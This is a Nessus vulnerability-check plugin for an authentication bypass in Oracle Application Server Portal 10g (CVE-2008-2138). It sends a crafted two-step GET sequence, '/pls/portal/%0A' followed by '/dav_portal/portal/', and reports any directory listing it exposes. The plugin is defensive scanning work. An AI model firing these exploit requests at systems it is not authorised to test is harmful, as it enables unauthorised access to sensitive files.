#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(32479);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2008-2138");
  script_bugtraq_id(29119);
  script_osvdb_id(45172);

  script_name(english:"Oracle Application Server Portal 10g Authentication Bypass");
  script_summary(english:"Attempts to access remote OAS Portal without credentials");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an authentication bypass
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Oracle Application Server. 

By sending a specially crafted GET request to the version of Oracle
Application Server installed on the remote host, an unauthenticated
attacker can access potentially sensitive files listed under the
directory '/dav_portal/portal'." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/491865" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(264);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/05/29");
 script_cvs_date("$Date: 2015/09/24 23:21:18 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:application_server_portal");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"Databases");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

http_cookies_style(style:HTTP_COOKIES_RFC2109);
port = get_http_port(default:80);

# Check if we are looking Oracle Application Servers
banner = get_http_banner(port:port);
if (!banner || "Oracle-Application-Server" >!< banner ) exit(0);

# Send request and get cookie.
init_cookiejar();
exploit1 = "/pls/portal/%0A";
r = http_send_recv3(method: "GET", item:exploit1, port:port);
if (isnull(r)) exit(0);

# If we see the cookie ...
if (egrep(string: r[1], pattern: "Set-Cookie2?:", icase: 1))
{
  exploit2 = "/dav_portal/portal/";
  r = http_send_recv3(method: "GET", item:exploit2, port:port);
  if (isnull(r)) exit(0); 

  # There is a problem if we see ...
  if ("Index of /dav_portal/portal" >< r[2])
  {
    info = NULL;
    foreach line (split(r[2], keep:FALSE))
    {
      pat = "^[ ]*<a href=[^>]+>([^<]+)</a>(.+)$";
      if (ereg(pattern:pat, string:line))
      { 
        line = ereg_replace(pattern:pat, string:line, replace: "\1 \2");
        info += "  " +line + '\n';
        count++;
     }
     # Limit the number of directories in final report to 15	
     if (count >= 15) break; 
    }

    if (count > 0)
    {	
      if (report_verbosity)	
      {
        report = string(
          "\n",
          "Nessus was able to obtain a directory listing with the\n",
          "following sequence of URLs :\n",
          "\n",
          "  ", build_url(port: port, qs: exploit1), "\n",
          "  ", build_url(port: port, qs: exploit2), "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here is the listing (limited to 15 entries) :\n",
            "\n",
            info
          );
        }
        security_warning(port:port,extra:report);
      }
      else security_warning(port);
    } 
  }
}
